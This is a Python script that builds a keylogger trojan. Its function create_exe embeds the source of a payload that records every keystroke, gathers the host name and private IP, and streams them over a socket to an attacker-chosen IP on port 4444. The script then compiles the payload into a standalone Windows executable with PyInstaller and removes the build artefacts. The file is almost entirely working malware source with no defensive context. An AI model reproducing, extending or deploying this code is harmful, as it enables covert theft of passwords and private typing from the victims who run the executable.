import subprocess, os, shutil


def create_exe(ip: str, trojan_name: str):
    code = f"""
from win32api import GetComputerName
from pickle import dumps
import socket
from pynput import keyboard

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
words = ""


def rm_junks():
    global words
    if len(words) >= 800:
        additional = len(words) - 800
        words = words[additional:]
    else:
        pass


def on_press(key):
    global words
    try:
        words += str(key.char)
    except AttributeError:
        words += " [" + str(key).split('.')[1] + '] '
    rm_junks()
    sock.sendall(words.encode())


def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False


def get_ip() -> list:
    soc = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    soc.connect(("8.8.8.8", 80))
    private_ip = soc.getsockname()[0]
    name = GetComputerName()
    soc.close()
    data = [name, private_ip]
    return data


def connect(data_list: list):
    sock.connect(("{ip}", 4444))
    while True:
        sock.sendall(dumps(data_list))
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
            break
    sock.close()


if __name__ == "__main__":
    data = get_ip()
    connect(data)
    """
    filename = f"{trojan_name}.py"
    with open(filename, "w") as f:
        f.write(code)

    # Run PyInstaller
    subprocess.run(["pyinstaller", "--onefile", filename])

    # Move EXE from dist to current folder
    exe_path = os.path.join("dist", f"{trojan_name}.exe")
    shutil.move(exe_path, f"{trojan_name}.exe")

    # Clean up unnecessary files/folders
    shutil.rmtree("build", ignore_errors=True)
    shutil.rmtree("dist", ignore_errors=True)
    os.remove(f"{trojan_name}.spec")
    os.remove(filename)
